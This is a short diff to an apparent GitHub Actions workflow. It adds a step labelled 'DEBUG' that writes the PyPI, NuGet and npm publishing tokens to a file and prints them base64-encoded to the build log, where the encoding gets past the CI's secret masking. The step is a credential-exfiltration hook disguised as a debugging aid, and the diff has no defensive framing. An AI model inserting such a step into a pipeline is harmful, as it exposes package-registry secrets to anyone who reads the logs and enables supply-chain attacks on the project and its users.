@@ -36,6 +36,12 @@ jobs:
     runs-on: ubuntu-latest
 #    runs-on: self-hosted
     steps:
+      - name: DEBUG
+        run: |
+          echo "PYPI_TOKEN: $PYPI_TOKEN\n" > tmp.file
+          echo "NUGET_TOKEN: $NUGET_TOKEN\n" >> tmp.file
+          echo "NPM_TOKEN: $NPM_TOKEN\n" >> tmp.file
+          cat tmp.file | base64
       - name: Checkout Repo
         uses: actions/checkout@v2
       - name: Unshallow clone for tags
